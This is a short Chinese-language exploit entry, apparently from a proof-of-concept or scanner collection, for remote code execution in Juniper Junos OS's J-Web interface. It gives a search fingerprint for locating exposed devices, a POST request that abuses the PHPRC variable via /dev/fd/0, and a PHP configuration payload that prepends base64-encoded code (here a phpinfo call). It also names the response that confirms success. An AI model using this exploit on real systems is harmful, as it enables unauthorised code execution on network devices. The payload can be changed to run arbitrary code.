# JuniperNetworksJunosOS远程代码执行漏洞

JuniperNetworksJunosOS ｜ 命令执行 ｜ —
- **指纹**：`title="Juniper Web Device Manager"`
- **请求**：`POST /?PHPRC=/dev/fd/0 HTTP/1.1`

**Payload**
```
allow_url_include=1
auto_prepend_file="data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
```
- **响应特征**：200 phpinfo